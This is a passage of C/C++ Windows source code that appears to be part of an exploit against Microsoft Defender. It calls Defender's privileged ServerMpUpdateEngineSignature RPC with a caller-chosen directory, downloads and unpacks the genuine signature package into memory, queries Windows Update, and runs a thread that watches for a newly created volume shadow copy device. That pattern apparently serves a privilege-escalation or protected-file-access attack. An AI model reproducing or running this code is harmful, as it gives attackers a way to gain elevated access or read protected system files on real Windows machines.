		args->errstat = 0;
		args->errstat0 = 0;
		args->errstat1 = 0;
	}
	if (!args || !args->dirpath[0]) {
		if (args) {
			args->res = RPC_X_NULL_REF_POINTER;
			args->stage = 103;
			if (args->hevent)
				SetEvent(args->hevent);
		}
		return;
	}
	if (!initializeAPIs()) {
		args->res = ERROR_PROC_NOT_FOUND;
		args->stage = 100;
		if (args->hevent)
			SetEvent(args->hevent);
		return;
	}
	RPC_WSTR MS_WD_UUID = (RPC_WSTR)L"c503f532-443a-4c69-8300-ccd1fbdb3839";
	RPC_WSTR StringBinding = NULL;
	args->stage = 2;
	args->composeStatus = RpcStringBindingComposeW(MS_WD_UUID, (RPC_WSTR)L"ncalrpc", NULL, (RPC_WSTR)L"IMpService77BDAF73-B396-481F-9042-AD358843EC24", NULL, &StringBinding);
	if (args->composeStatus != RPC_S_OK)
	{
		printf("Unexpected error while building an RPC binding from string !!!");
		args->res = RPC_S_INVALID_STRING_BINDING;
		args->stage = 101;
		if (args->hevent)
			SetEvent(args->hevent);
		return;
	}
	RPC_BINDING_HANDLE bindhandle = NULL;
	args->stage = 3;
	args->bindStatus = RpcBindingFromStringBindingW(StringBinding, &bindhandle);
	RpcStringFreeW(&StringBinding);
	StringBinding = NULL;
	if (args->bindStatus != RPC_S_OK)
	{
		printf("Failed to connect to windows defender RPC port !!!");
		args->res = RPC_S_SERVER_UNAVAILABLE;
		args->stage = 102;
		if (args->hevent)
			SetEvent(args->hevent);
		return;
	}

	args->stage = 4;
	args->versionMatch = HasMatchingUpdateEngineVersion(args->dirpath);

	args->errstat = 0;
	args->errstat0 = 0;
	args->errstat1 = 0;
	args->stage = 5;
	RPC_STATUS stat = RPC_S_OK;
	args->stage = 51;
	stat = Proc42_ServerMpUpdateEngineSignature(bindhandle, 0, args->dirpath, &args->errstat0);
	args->stage = 52;
	args->rpcStatus0 = stat;
	args->errstat = args->errstat0;

	if (stat != 0) {
		args->stage = 6;
		args->errstat1 = 0;
		args->stage = 61;
		stat = Proc42_ServerMpUpdateEngineSignature(bindhandle, 1, args->dirpath, &args->errstat1);
		args->stage = 62;
		args->rpcStatus1 = stat;
		args->errstat = args->errstat1;
	}

	RpcBindingFree(&bindhandle);
	args->stage = 7;
	args->res = stat;
	if (args->hevent)
		SetEvent(args->hevent);

}

// Thread entry point that runs the Defender RPC call and records status.
DWORD WINAPI WDCallerThread(void* args)
{
	if (!args)
		return ERROR_BAD_ARGUMENTS;
	((WDRPCWorkerThreadArgs*)args)->workerTid = GetCurrentThreadId();
	((WDRPCWorkerThreadArgs*)args)->stage = 0;
	CallWD((WDRPCWorkerThreadArgs*)args);
	((WDRPCWorkerThreadArgs*)args)->workerExitCode = ERROR_SUCCESS;
	return ERROR_SUCCESS;

}














// Open the in-memory CAB source for FDI extraction callbacks.
CabOpArguments* CUST_FNOPEN(const char* filename, int oflag, int pmode)
{

	CabOpArguments* cbps = (CabOpArguments*)malloc(sizeof(CabOpArguments));
	if (!cbps)
		return NULL;
	ZeroMemory(cbps, sizeof(CabOpArguments));
	cbps->buff = (char*)cabbuff2;
	cbps->FileSize = cabbuffsz;
	return cbps;
}

// Seek within the in-memory CAB buffer for FDI extraction callbacks.
INT CUST_FNSEEK(HANDLE hf,
	long offset,
	int origin)
{

	if (hf)
	{
		CabOpArguments* CabOpArgs = (CabOpArguments*)hf;
		if (origin == SEEK_SET)
			CabOpArgs->ptroffset = offset;
		if (origin == SEEK_CUR)
			CabOpArgs->ptroffset += offset;
		if (origin == SEEK_END)
			CabOpArgs->ptroffset = (size_t)CabOpArgs->FileSize + (ptrdiff_t)offset;

		return CabOpArgs->ptroffset;

	}

	return -1;
}


// Read bytes from the in-memory CAB buffer for FDI extraction callbacks.
UINT CUST_FNREAD(CabOpArguments* hf,
	void* const buffer,
	unsigned const buffer_size)
{

	if (hf)
	{
		CabOpArguments* CabOpArgs = (CabOpArguments*)hf;
		if (CabOpArgs->buff)
		{
			unsigned read_size = buffer_size;
			if (CabOpArgs->ptroffset + read_size > CabOpArgs->FileSize)
				read_size = (CabOpArgs->FileSize > CabOpArgs->ptroffset)
				            ? (unsigned)(CabOpArgs->FileSize - CabOpArgs->ptroffset)
				            : 0;
			if (!read_size)
				return 0;
			memmove(buffer, &CabOpArgs->buff[CabOpArgs->ptroffset], read_size);
			CabOpArgs->ptroffset += read_size;
			return read_size;
		}
	}

	return 0;
}

// Write extracted CAB bytes into the current in-memory file buffer.
UINT CUST_FNWRITE(CabOpArguments* hf,
	const void* buffer,
	unsigned int count)
{

	if (hf)
	{
		if (hf->buff) {
			if (hf->ptroffset + count > hf->FileSize)
				count = (hf->FileSize > (DWORD)hf->ptroffset)
				        ? (unsigned)(hf->FileSize - (DWORD)hf->ptroffset)
				        : 0;
			if (!count)
				return 0;
			memmove(&hf->buff[hf->ptroffset], buffer, count);
			hf->ptroffset += count;
			return count;
		}
	}


	return 0;
}

// Close and free an FDI callback file context.
INT CUST_FNCLOSE(CabOpArguments* fnFileClose)
{

	free(fnFileClose);
	return 0;
}

// Allocate memory for the FDI extraction engine.
VOID* CUST_FNALLOC(size_t cb)
{
	return malloc(cb);
}

// Free memory allocated for the FDI extraction engine.
VOID CUST_FNFREE(void* buff)
{
	free(buff);
}

// Capture extracted CAB file payloads into a linked list.
INT_PTR CUST_FNFDINOTIFY(
	FDINOTIFICATIONTYPE fdinotify, PFDINOTIFICATION    pfdin
) {
	CabOpArguments** ptr = NULL;
	CabOpArguments* lcab = NULL;
	switch (fdinotify)
	{
	case fdintCOPY_FILE:
		if (_stricmp(pfdin->psz1, "MpSigStub.exe") == 0)
			return NULL;

		ptr = (CabOpArguments**)pfdin->pv;
		lcab = *ptr;
		if (lcab == NULL) {
			lcab = (CabOpArguments*)malloc(sizeof(CabOpArguments));
			if (!lcab) return -1;
			ZeroMemory(lcab, sizeof(CabOpArguments));
			lcab->first = lcab;
			lcab->filename = (char*)malloc(strlen(pfdin->psz1) + sizeof(char));
			if (!lcab->filename) { free(lcab); return -1; }
			ZeroMemory(lcab->filename, strlen(pfdin->psz1) + sizeof(char));
			memmove(lcab->filename, pfdin->psz1, strlen(pfdin->psz1));
			lcab->FileSize = pfdin->cb;
			lcab->buff = (char*)malloc(lcab->FileSize);
			if (!lcab->buff) { free(lcab->filename); free(lcab); return -1; }
			ZeroMemory(lcab->buff, lcab->FileSize);


		}
		else
		{
			CabOpArguments* first = lcab->first;

			lcab->next = (CabOpArguments*)malloc(sizeof(CabOpArguments));
			if (!lcab->next) return -1;
			ZeroMemory(lcab->next, sizeof(CabOpArguments));
			lcab->next->first = first;
			lcab = lcab->next;

			lcab->filename = (char*)malloc(strlen(pfdin->psz1) + sizeof(char));
			if (!lcab->filename) { free(lcab); return -1; }
			ZeroMemory(lcab->filename, strlen(pfdin->psz1) + sizeof(char));
			memmove(lcab->filename, pfdin->psz1, strlen(pfdin->psz1));
			lcab->FileSize = pfdin->cb;
			lcab->buff = (char*)malloc(lcab->FileSize);
			if (!lcab->buff) { free(lcab->filename); free(lcab); return -1; }
			ZeroMemory(lcab->buff, lcab->FileSize);
		}

		lcab->first->index++;
		*ptr = lcab;



		return (INT_PTR)lcab;
	case fdintCLOSE_FILE_INFO:
		return TRUE;
	default:
		return 0;
	}
	return 0;
}

// Locate the embedded CAB resource inside the downloaded Defender package.
void* GetCabFileFromBuff(PIMAGE_DOS_HEADER pvRawData, ULONG cbRawData, ULONG* cabsz)
{
	if (cbRawData < sizeof(IMAGE_DOS_HEADER))
	{
		return 0;
	}

	if (pvRawData->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return 0;
	}

	ULONG e_lfanew = pvRawData->e_lfanew, s = e_lfanew + sizeof(IMAGE_NT_HEADERS);

	if (e_lfanew >= s || s > cbRawData)
	{
		return 0;
	}

	PIMAGE_NT_HEADERS pinth = (PIMAGE_NT_HEADERS)RtlOffsetToPointer(pvRawData, e_lfanew);



	if (pinth->Signature != IMAGE_NT_SIGNATURE)
	{
		return 0;
	}

	ULONG SizeOfImage = pinth->OptionalHeader.SizeOfImage, SizeOfHeaders = pinth->OptionalHeader.SizeOfHeaders;

	s = e_lfanew + SizeOfHeaders;

	if (SizeOfHeaders > SizeOfImage || SizeOfHeaders >= s || s > cbRawData)
	{
		return 0;
	}

	s = FIELD_OFFSET(IMAGE_NT_HEADERS, OptionalHeader) + pinth->FileHeader.SizeOfOptionalHeader;

	if (s > SizeOfHeaders)
	{
		return 0;
	}

	ULONG NumberOfSections = pinth->FileHeader.NumberOfSections;

	PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)RtlOffsetToPointer(pinth, s);

	ULONG Size;

	if (NumberOfSections)
	{
		if (e_lfanew + s + NumberOfSections * sizeof(IMAGE_SECTION_HEADER) > SizeOfHeaders)
		{
			return 0;
		}

		do
		{
				if (Size = ((pish->Misc.VirtualSize < pish->SizeOfRawData) ? pish->Misc.VirtualSize : pish->SizeOfRawData))
			{
				union {
					ULONG VirtualAddress, PointerToRawData;
				};

				VirtualAddress = pish->VirtualAddress, s = VirtualAddress + Size;

				if (VirtualAddress > s || s > SizeOfImage)
				{
					return 0;
				}

				PointerToRawData = pish->PointerToRawData, s = PointerToRawData + Size;

				if (PointerToRawData > s || s > cbRawData)
				{
					return 0;
				}

				char rsrc[] = ".rsrc";
				if (memcmp(pish->Name, rsrc, sizeof(rsrc)) == 0)
				{
					typedef struct _IMAGE_RESOURCE_DIRECTORY2 {
						DWORD   Characteristics;
						DWORD   TimeDateStamp;
						WORD    MajorVersion;
						WORD    MinorVersion;
						WORD    NumberOfNamedEntries;
						WORD    NumberOfIdEntries;
						IMAGE_RESOURCE_DIRECTORY_ENTRY DirectoryEntries[];
					} IMAGE_RESOURCE_DIRECTORY2, * PIMAGE_RESOURCE_DIRECTORY2;

					PIMAGE_RESOURCE_DIRECTORY2 pird = (PIMAGE_RESOURCE_DIRECTORY2)RtlOffsetToPointer(pvRawData, pish->PointerToRawData);

					PIMAGE_RESOURCE_DIRECTORY2 prsrc = pird;
					PIMAGE_RESOURCE_DIRECTORY_ENTRY pirde = { 0 };
					PIMAGE_RESOURCE_DATA_ENTRY pdata = 0;

					while (pird->NumberOfNamedEntries + pird->NumberOfIdEntries)
					{




						pirde = &pird->DirectoryEntries[0];
						if (!pirde->DataIsDirectory)
						{
							pdata = (PIMAGE_RESOURCE_DATA_ENTRY)RtlOffsetToPointer(prsrc, pirde->OffsetToData);
							pdata->OffsetToData -= pish->VirtualAddress - pish->PointerToRawData;
							void* cabfile = RtlOffsetToPointer(pvRawData, pdata->OffsetToData);
							if (cabsz)
								*cabsz = pdata->Size;
							return cabfile;
						}
						pird = (PIMAGE_RESOURCE_DIRECTORY2)RtlOffsetToPointer(prsrc, pirde->OffsetToDirectory);
					}
					break;




				}



			}

		} while (pish++, --NumberOfSections);
	}
	return NULL;

}


// Download the Defender update package and return its extracted payload files.
UpdateFiles* GetUpdateFiles(int* filecount)
{
	if (!initializeAPIs())
		return NULL;
	
	
	

	HINTERNET hint = NULL;
	HINTERNET hint2 = NULL;
	wchar_t contentLength[64] = { 0 };
	DWORD index = 0;
	DWORD sz = sizeof(contentLength);
	bool res2 = 0;
	wchar_t filesz[50] = { 0 };
	void* exebuff = NULL;
	DWORD readsz = 0;
	void* mappedbuff = NULL;
	DWORD ressz = 0;
	ERF erfstruct = { 0 };
	HFDI hcabctx = NULL;
	bool extractres = false;
	CabOpArguments* CabOpArgs = NULL;
	UpdateFiles* firstupdt = NULL;
	UpdateFiles* current = NULL;


	hint = InternetOpen(L"Chrome/141.0.0.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
	if (!hint)
	{
		printf("Failed to open internet, error : %d", GetLastError());
		goto cleanup;
	}

	
	
	
	hint2 = InternetOpenUrl(
		hint,
		L"https://definitionupdates.microsoft.com/packages/content/mpam-fe.exe?packageType=Signatures&packageVersion=1.449.86.0&arch=amd64&engineVersion=1.1.26030.3008",
		NULL,
		0,
		INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
		0);
	if (!hint2)
	{
		printf("Failed to open internet URL, error : %d", GetLastError());
		goto cleanup;
	}

	res2 = HttpQueryInfo(hint2, HTTP_QUERY_CONTENT_LENGTH, contentLength, &sz, &index);
	if (!res2)
	{
		printf("Failed to query update size, error : %d", GetLastError());
		goto cleanup;
	}


	wcscpy(filesz, contentLength);
	{
		int _sz = _wtoi(filesz);
		if (_sz <= 0 || _sz > 200 * 1024 * 1024)
		{
			printf("Content-Length value out of range: %d\n", _sz);
			goto cleanup;
		}
		sz = (DWORD)_sz;
	}


	exebuff = malloc(sz);
	if (!exebuff)
	{
		printf("Failed to allocate memory to download file !!!");
		goto cleanup;
	}
	ZeroMemory(exebuff, sz);

	if (!InternetReadFile(hint2, exebuff, sz, &readsz) || readsz != sz)
	{

		printf("Failed to download update from internet, error : %d", GetLastError());
		goto cleanup;
	}
	InternetCloseHandle(hint);
	hint = NULL;
	InternetCloseHandle(hint2);
	hint2 = NULL;
	mappedbuff = GetCabFileFromBuff((PIMAGE_DOS_HEADER)exebuff, sz, &ressz);



	if (!mappedbuff)
	{
		printf("Failed to retrieve cabinet file from downloaded file.\n");
		goto cleanup;
	}




	cabbuff2 = mappedbuff;
	cabbuffsz = ressz;

	hcabctx = FDICreate((PFNALLOC)CUST_FNALLOC, CUST_FNFREE, (PFNOPEN)CUST_FNOPEN, (PFNREAD)CUST_FNREAD, (PFNWRITE)CUST_FNWRITE, (PFNCLOSE)CUST_FNCLOSE, (PFNSEEK)CUST_FNSEEK, cpuUNKNOWN, &erfstruct);
	if (!hcabctx)
	{
		printf("Failed to create cab context, error : 0x%x", erfstruct.erfOper);
		goto cleanup;
	}



	extractres = FDICopy(hcabctx, (char*)"\\update.cab", (char*)"C:\\temp", NULL, (PFNFDINOTIFY)CUST_FNFDINOTIFY, NULL, &CabOpArgs);
	if (!extractres)
	{
		printf("Failed to extract cab file, error : 0x%x", erfstruct.erfOper);
		goto cleanup;
	}
	FDIDestroy(hcabctx);
	hcabctx = NULL;

	if (!CabOpArgs)
	{
		printf("Unexpected empty buffer after extracting cab file.\n");
		return NULL;
	}

	CabOpArgs = CabOpArgs->first;

	firstupdt = (UpdateFiles*)malloc(sizeof(UpdateFiles));
	if (firstupdt)
	{
		ZeroMemory(firstupdt, sizeof(UpdateFiles));
		current = firstupdt;
		CabOpArguments* cabiter = CabOpArgs;
		while (cabiter)
		{
			if (filecount)
				*filecount += 1;
			strcpy(current->filename, cabiter->filename);
			DWORD buffsz = cabiter->FileSize;
			current->filebuff = malloc(buffsz);
			if (current->filebuff)
				memmove(current->filebuff, cabiter->buff, buffsz);
			current->filesz = buffsz;
			cabiter = cabiter->next;
			if (cabiter)
			{
				current->next = (UpdateFiles*)malloc(sizeof(UpdateFiles));
				if (!current->next)
					break;
				ZeroMemory(current->next, sizeof(UpdateFiles));
				current = current->next;
			}
		}
	}

	// Free the CabOpArguments linked list now that we've copied everything.
	{
		CabOpArguments* cabclean = CabOpArgs;
		while (cabclean)
		{
			free(cabclean->buff);
			free(cabclean->filename);
			CabOpArguments* cabnext = cabclean->next;
			free(cabclean);
			cabclean = cabnext;
		}
		CabOpArgs = NULL;
	}

cleanup:

	if (CabOpArgs)
	{
		CabOpArguments* current = CabOpArgs->first ? CabOpArgs->first : CabOpArgs;
		while (current)
		{
			free(current->buff);
			free(current->filename);
			CabOpArguments* cabnext = current->next;
			free(current);
			current = cabnext;
		}
	}
	if (hint)
		InternetCloseHandle(hint);
	
	if (hint2)
		InternetCloseHandle(hint2);
	if (exebuff)
		free(exebuff);

	return firstupdt;


}

// Search for an available Defender signature update through Windows Update.
bool CheckForWDUpdates(wchar_t* updatetitle, bool* criterr)
{
	
	
	

	IUpdateSearcher* updsrch = 0;
	bool updatesfound = false;
	IUpdateSession* updsess = 0;
	CLSID clsid;
	HRESULT hr = CLSIDFromProgID(OLESTR("Microsoft.Update.Session"), &clsid);
	ISearchResult* srchres = 0;
	IUpdateCollection* updcollection = 0;
	LONG updnum = 0;
	BSTR title = 0;
	ICategoryCollection* catcoll = 0;
	ICategory* cat = 0;
	BSTR catname = 0;
	IUpdate* upd = 0;
	BSTR search_criteria = SysAllocString(L"Type='Software'");
	HRESULT coinit_hr = CoInitialize(NULL);
	bool comini = SUCCEEDED(coinit_hr);
	if (comini) {
		CoInitializeSecurity(
			NULL,
			-1,
			NULL,
			NULL,
			RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
			RPC_C_IMP_LEVEL_IMPERSONATE,
			NULL,
			EOAC_DYNAMIC_CLOAKING,
			NULL);
		}
	if (!comini) {
		printf("Failed to initialize COM\n");
		*criterr = true;
		return false;
	}

	
	hr = CoCreateInstance(clsid, NULL, CLSCTX_INPROC_SERVER, IID_IUpdateSession, (LPVOID*)&updsess);

	if (FAILED(hr) || !updsess)
	{
		printf("CoCreateInstance returned a NULL pointer.\n");
		*criterr = true;
		goto cleanup;
	}
	ApplyWUProxySecurity((IUnknown*)updsess);

	
	hr = updsess->CreateUpdateSearcher(&updsrch);
	if (hr)
	{
		printf("IUpdateSession->CreateUpdateSearcher failed with error : 0x%0.X", hr);
		*criterr = true;
		goto cleanup;
	}

	if (!updsrch)
	{
		printf("IUpdateSession->CreateUpdateSearcher returned a NULL pointer.\n");
		*criterr = true;
		goto cleanup;
	}
	ApplyWUProxySecurity((IUnknown*)updsrch);

	
	hr = updsrch->Search(search_criteria, &srchres);
	if (hr)
	{
		if (hr == HRESULT_FROM_WIN32(ERROR_ACCESS_DENIED)) {
			if (CheckForWDUpdatesDirect(updatetitle)) {
							*criterr = false;
				updatesfound = true;
				goto cleanup;
			}
				}
		printf("IUpdateSearcher->Search failed with error : 0x%0.X", hr);
		*criterr = true;
		goto cleanup;
	}

	
	hr = srchres->get_Updates(&updcollection);
	if (hr)
	{
		printf("ISearchResult->get_Updates failed with error : 0x%0.X", hr);
		*criterr = true;
		goto cleanup;
	}

	if (!updcollection)
	{
		printf("ISearchResult->get_Updates returned a NULL pointer.\n");
		*criterr = true;
		goto cleanup;
	}

	
	hr = updcollection->get_Count(&updnum);
	if (hr)
	{
		printf("IUpdateCollection->get_Count failed with error : 0x%0.X", hr);
		*criterr = true;
		goto cleanup;
	}

	
	for (LONG i = 0; i < updnum; i++)
	{
		if (upd)
		{
			upd->Release();
			upd = 0;
		}
		title = 0;
		catname = 0;
	
		bool IsWdUdpate = false;
		bool IsSigUpdate = false;
		hr = updcollection->get_Item(i, &upd);
		if (hr)
		{
			printf("IUpdateCollection->get_Item failed with error : 0x%0.X", hr);
			*criterr = true;
			goto cleanup;
		}
		if (!upd)
		{
			printf("IUpdateCollection->get_Item returned a NULL pointer.\n");
			*criterr = true;
			goto cleanup;
		}


		hr = upd->get_Title(&title);
		if (hr)
		{
			printf("IUpdateCollection->get_Title failed with error : 0x%0.X", hr);
			continue;
		}
		if (!title)
		{
			printf("IUpdateCollection->get_Item returned a NULL pointer.\n");
			continue;
		}
		title[SysStringLen(title)] = NULL;



		catcoll = 0;
		hr = upd->get_Categories(&catcoll);
		if (!catcoll)
		{
			printf("IUpdateCollection->get_Categories returned a NULL pointer.\n");
			if (title) { SysFreeString(title); title = 0; }
			continue;
		}
		LONG catcount = 0;
		hr = catcoll->get_Count(&catcount);
		for (LONG j = 0; j < catcount; j++)
		{
			cat = 0;
			hr = catcoll->get_Item(j, &cat);
			if (!cat)
			{
				printf("ICategoryCollection->get_Item returned NULL pointer.\n");
				continue;
			}
			catname = 0;
			cat->get_Name(&catname);
			if (catname)
			{
				if (!IsWdUdpate)
					IsWdUdpate = _wcsicmp(catname, L"Microsoft Defender Antivirus") == 0;
				if (!IsSigUpdate)
					IsSigUpdate = _wcsicmp(catname, L"Definition Updates") == 0;
				SysFreeString(catname);
				catname = 0;
			}
			cat->Release();
			cat = 0;
		}
		catcoll->Release();
		catcoll = 0;
		updatesfound = IsWdUdpate && IsSigUpdate;
		if (updatesfound)
			break;
		if (title) { SysFreeString(title); title = 0; }
	}

	if (updatesfound && updatetitle && title) {
		memmove(updatetitle, title, lstrlenW(title) * sizeof(wchar_t));
	}

cleanup:
	if (title)
		SysFreeString(title);
	if (catname)
		SysFreeString(catname);
	if (cat)
		cat->Release();
	if (catcoll)
		catcoll->Release();
	if (search_criteria)
		SysFreeString(search_criteria);
	if (updcollection)
		updcollection->Release();
	if (srchres)
		srchres->Release();
	if (updsrch)
		updsrch->Release();
	if (updsess)
		updsess->Release();
	if (upd)
		upd->Release();
	CoUninitialize();


	return updatesfound;
}










// Reverse a mutable C string in place.
void rev(char* s) {

	
	int l = 0;
	int r = strlen(s) - 1;
	char t;

	
	while (l < r) {

		
		t = s[l];
		s[l] = s[r];
		s[r] = t;

		
		l++;
		r--;
	}
}

// Free a linked list of discovered shadow-copy object names.
void DestroyVSSNamesList(LLShadowVolumeNames* First)
{
	while (First)
	{
		free(First->name);
		LLShadowVolumeNames* next = First->next;
		free(First);
		First = next;
	}
}

// Enumerate existing shadow-copy devices from the NT object directory.
LLShadowVolumeNames* RetrieveCurrentVSSList(HANDLE hobjdir, bool* criticalerr, int* vscnumber, DWORD* errorcode)
{


	if (!criticalerr || !vscnumber || !errorcode)
		return NULL;

	*vscnumber = 0;
	ULONG scanctx = 0;
	ULONG reqsz = sizeof(OBJECT_DIRECTORY_INFORMATION) + (UNICODE_STRING_MAX_BYTES * 2);
	ULONG retsz = 0;
	OBJECT_DIRECTORY_INFORMATION* objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
	if (!objdirinfo)
	{
		printf("Failed to allocate required buffer to query object manager directory.\n");
		*criticalerr = true;
		*errorcode = ERROR_NOT_ENOUGH_MEMORY;
		return NULL;
	}
	ZeroMemory(objdirinfo, reqsz);
	NTSTATUS stat = STATUS_SUCCESS;
	do
	{
		stat = _NtQueryDirectoryObject(hobjdir, objdirinfo, reqsz, FALSE, FALSE, &scanctx, &retsz);
		if (stat == STATUS_SUCCESS)
			break;
		else if (stat != STATUS_MORE_ENTRIES)
		{
			printf("NtQueryDirectoryObject failed with 0x%0.8X\n", stat);
			*criticalerr = true;
			*errorcode = RtlNtStatusToDosError(stat);
			return NULL;
		}

		free(objdirinfo);
		reqsz += sizeof(OBJECT_DIRECTORY_INFORMATION) + 0x100;
		objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
		if (!objdirinfo)
		{
			printf("Failed to allocate required buffer to query object manager directory.\n");
			*criticalerr = true;
			*errorcode = ERROR_NOT_ENOUGH_MEMORY;
			return NULL;
		}
		ZeroMemory(objdirinfo, reqsz);
	} while (1);
	void* emptybuff = malloc(sizeof(OBJECT_DIRECTORY_INFORMATION));
	if (!emptybuff)
	{
		printf("Failed to allocate empty-entry sentinel.\n");
		*criticalerr = true;
		*errorcode = ERROR_NOT_ENOUGH_MEMORY;
		free(objdirinfo);
		return NULL;
	}
	ZeroMemory(emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION));
	LLShadowVolumeNames* LLVSScurrent = NULL;
	LLShadowVolumeNames* LLVSSfirst = NULL;
	for (ULONG i = 0; i < ULONG_MAX; i++)
	{
		if (memcmp(&objdirinfo[i], emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION)) == 0)
		{
			free(emptybuff);
			emptybuff = NULL;
			break;
		}
		if (!objdirinfo[i].TypeName.Buffer || !objdirinfo[i].Name.Buffer)
		{
			continue;
		}
		if (_wcsicmp(L"Device", objdirinfo[i].TypeName.Buffer) == 0)
		{
			wchar_t cmpstr[] = { L"HarddiskVolumeShadowCopy" };
			if (objdirinfo[i].Name.Length >= sizeof(cmpstr))
			{
				if (memcmp(cmpstr, objdirinfo[i].Name.Buffer, sizeof(cmpstr) - sizeof(wchar_t)) == 0)
				{
					(*vscnumber)++;
					if (LLVSScurrent)
					{
						LLVSScurrent->next = (LLShadowVolumeNames*)malloc(sizeof(LLShadowVolumeNames));
						if (!LLVSScurrent->next)
						{
							printf("Failed to allocate memory.\n");
							*criticalerr = true;
							*errorcode = ERROR_NOT_ENOUGH_MEMORY;
							DestroyVSSNamesList(LLVSSfirst);
							free(objdirinfo);
							free(emptybuff);
							return NULL;
						}
						ZeroMemory(LLVSScurrent->next, sizeof(LLShadowVolumeNames));
						LLVSScurrent = LLVSScurrent->next;
						LLVSScurrent->name = (wchar_t*)malloc(objdirinfo[i].Name.Length + sizeof(wchar_t));
						if (!LLVSScurrent->name)
						{
							printf("Failed to allocate memory !!!\n");
							*errorcode = ERROR_NOT_ENOUGH_MEMORY;
							*criticalerr = true;
							DestroyVSSNamesList(LLVSSfirst);
							free(objdirinfo);
							free(emptybuff);
							return NULL;
						}
						ZeroMemory(LLVSScurrent->name, objdirinfo[i].Name.Length + sizeof(wchar_t));
						memmove(LLVSScurrent->name, objdirinfo[i].Name.Buffer, objdirinfo[i].Name.Length);
					}
					else
					{
						LLVSSfirst = (LLShadowVolumeNames*)malloc(sizeof(LLShadowVolumeNames));
						if (!LLVSSfirst)
						{
							printf("Failed to allocate memory.\n");
							*errorcode = ERROR_NOT_ENOUGH_MEMORY;
							*criticalerr = true;
							free(objdirinfo);
							free(emptybuff);
							return NULL;
						}
						ZeroMemory(LLVSSfirst, sizeof(LLShadowVolumeNames));
						LLVSScurrent = LLVSSfirst;
						LLVSScurrent->name = (wchar_t*)malloc(objdirinfo[i].Name.Length + sizeof(wchar_t));
						if (!LLVSScurrent->name)
						{
							printf("Failed to allocate memory !!!\n");
							*errorcode = ERROR_NOT_ENOUGH_MEMORY;
							*criticalerr = true;
							DestroyVSSNamesList(LLVSSfirst);
							free(objdirinfo);
							free(emptybuff);
							return NULL;
						}
						ZeroMemory(LLVSScurrent->name, objdirinfo[i].Name.Length + sizeof(wchar_t));
						memmove(LLVSScurrent->name, objdirinfo[i].Name.Buffer, objdirinfo[i].Name.Length);

					}

				}
			}
		}




	}
	free(objdirinfo);
	return LLVSSfirst;
}

// Watch for a newly created shadow-copy device and validate it is usable.
DWORD WINAPI ShadowCopyFinderThread(void* arg)
{
	shadowcopyfinderargs* args = (shadowcopyfinderargs*)arg;
	if (!args)
		return ERROR_BAD_ARGUMENTS;

	wchar_t* fullvsspath = args->fullvsspath;
	HANDLE hstopevent = args->hstopevent;

	wchar_t devicepath[] = L"\\Device";
	UNICODE_STRING udevpath = { 0 };
	RtlInitUnicodeString(&udevpath, devicepath);
	OBJECT_ATTRIBUTES objattr = { 0 };
	InitializeObjectAttributes(&objattr, &udevpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
	NTSTATUS stat = STATUS_SUCCESS;
	HANDLE hobjdir = NULL;
	DWORD retval = ERROR_SUCCESS;
	wchar_t newvsspath[MAX_PATH] = { 0 };
	wcscpy(newvsspath, L"\\Device\\");
	bool criterr = false;
	int vscnum = 0;
	bool restartscan = false;
	ULONG scanctx = 0;
	ULONG reqsz = sizeof(OBJECT_DIRECTORY_INFORMATION) + (UNICODE_STRING_MAX_BYTES * 2);
	ULONG retsz = 0;
	OBJECT_DIRECTORY_INFORMATION* objdirinfo = NULL;
	bool srchfound = false;
	wchar_t vsswinpath[MAX_PATH] = { 0 };
	UNICODE_STRING _vsswinpath = { 0 };

	OBJECT_ATTRIBUTES objattr2 = { 0 };
	IO_STATUS_BLOCK iostat = { 0 };
	HANDLE hlk = NULL;
	LLShadowVolumeNames* vsinitial = NULL;

	stat = _NtOpenDirectoryObject(&hobjdir, 0x0001, &objattr);
	if (stat)
	{
		printf("Failed to open object manager directory, error : 0x%0.8X", stat);
		retval = RtlNtStatusToDosError(stat);
		return retval;
	}
	void* emptybuff = malloc(sizeof(OBJECT_DIRECTORY_INFORMATION));
	if (!emptybuff)
	{
		printf("Failed to allocate memory !!!");
		retval = ERROR_NOT_ENOUGH_MEMORY;
		goto cleanup;
	}
	ZeroMemory(emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION));

	
	vsinitial = RetrieveCurrentVSSList(hobjdir, &criterr, &vscnum,&retval);

	if (criterr)
	{
		printf("Unexpected error while listing current volume shadow copy volumes\n");
		goto cleanup;
	}
	if (!vsinitial)
	{
		}
	else
	{
	}



	stat = STATUS_SUCCESS;

scanagain:
	do
	{
		if (objdirinfo)
			free(objdirinfo);
		objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
		if (!objdirinfo)
		{
			printf("Failed to allocate required buffer to query object manager directory.\n");
			retval = ERROR_NOT_ENOUGH_MEMORY;
			goto cleanup;
		}
		ZeroMemory(objdirinfo, reqsz);

		scanctx = 0;
		stat = _NtQueryDirectoryObject(hobjdir, objdirinfo, reqsz, FALSE, restartscan, &scanctx, &retsz);
		if (stat == STATUS_SUCCESS)
			break;
		else if (stat != STATUS_MORE_ENTRIES)
		{
			printf("NtQueryDirectoryObject failed with 0x%0.8X\n", stat);
			retval = RtlNtStatusToDosError(stat);
			goto cleanup;
		}
		reqsz += sizeof(OBJECT_DIRECTORY_INFORMATION) + 0x100;
	} while (1);
	


	for (ULONG i = 0; i < ULONG_MAX; i++)
	{
		if (memcmp(&objdirinfo[i], emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION)) == 0)
		{
			break;
		}
		if (!objdirinfo[i].TypeName.Buffer || !objdirinfo[i].Name.Buffer)
		{
			continue;
		}
		if (_wcsicmp(L"Device", objdirinfo[i].TypeName.Buffer) == 0)
		{
			wchar_t cmpstr[] = { L"HarddiskVolumeShadowCopy" };
			if (objdirinfo[i].Name.Length >= sizeof(cmpstr))
			{
				if (memcmp(cmpstr, objdirinfo[i].Name.Buffer, sizeof(cmpstr) - sizeof(wchar_t)) == 0)
				{
					
					LLShadowVolumeNames* current = vsinitial;
					bool found = false;
